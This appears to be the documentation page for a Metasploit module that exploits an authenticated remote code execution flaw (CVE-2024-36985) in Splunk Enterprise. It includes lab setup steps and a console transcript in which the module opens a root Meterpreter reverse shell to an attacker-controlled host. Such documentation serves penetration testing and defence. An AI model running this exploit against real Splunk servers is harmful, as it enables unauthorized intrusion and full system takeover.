## Vulnerable Application

This Metasploit module exploits a Remote Code Execution (RCE) vulnerability in Splunk Enterprise (splunk_archiver application).

The flaw is rooted in the unsafe use of a Splunk lookup function, specifically `| copybuckets`, within the splunk_archiver application, which ultimately leads to the execution of the helper script sudobash with attacker-controlled arguments.

The affected versions include any release prior to 9.0.10, as well as versions 9.1.2 through 9.1.5 and 9.2.0 through 9.2.2.

## Testing

### Docker

```
docker run \
  --name splunk \
  -p 8000:8000 \
  -p 8088:8088 \
  -p 9997:9997 \
  -e "SPLUNK_START_ARGS=--accept-license" \
  -e "SPLUNK_PASSWORD=password123" \
  splunk/splunk:8.2.4
```

### Manual

1. Download Splunk
```
wget -O splunk-8.2.4-87e2dda940d1-linux-2.6-amd64.deb 'https://download.splunk.com/products/splunk/releases/8.2.4/linux/splunk-8.2.4-87e2dda940d1-linux-2.6-amd64.deb'
```

2. Install
```
sudo dpkg -i splunk-8.2.4-87e2dda940d1-linux-2.6-amd64.deb
```

3. Execute
```
/opt/splunk/bin/splunk start
```

## Scenario

```
msf6 > use linux/http/splunk_auth_rce_cve_2024_36985
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/splunk_auth_rce_cve_2024_36985) > set RHOSTS 192.168.19.139
RHOSTS => 192.168.19.139
msf6 exploit(linux/http/splunk_auth_rce_cve_2024_36985) > set RPORT 8000
RPORT => 8000
msf6 exploit(linux/http/splunk_auth_rce_cve_2024_36985) > set FETCH_SRVPORT 8090
FETCH_SRVPORT => 8090
msf6 exploit(linux/http/splunk_auth_rce_cve_2024_36985) > set PASSWORD password123
PASSWORD => password123
msf6 exploit(linux/http/splunk_auth_rce_cve_2024_36985) > run

[*] Started reverse TCP handler on 192.168.19.130:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] SUCCESSFUL LOGIN. 'admin' : 'password123'
[+] The target appears to be vulnerable. Exploitable version found: 8.2.4, splunk_archiver app is enabled
[*] Sending stage (3045380 bytes) to 192.168.19.139
[*] Meterpreter session 1 opened (192.168.19.130:4444 -> 192.168.19.139:55936) at 2025-12-12 15:04:44 -0500

meterpreter > sysinfo
Computer     : 192.168.19.139
OS           : Ubuntu 18.04 (Linux 5.4.0-150-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
```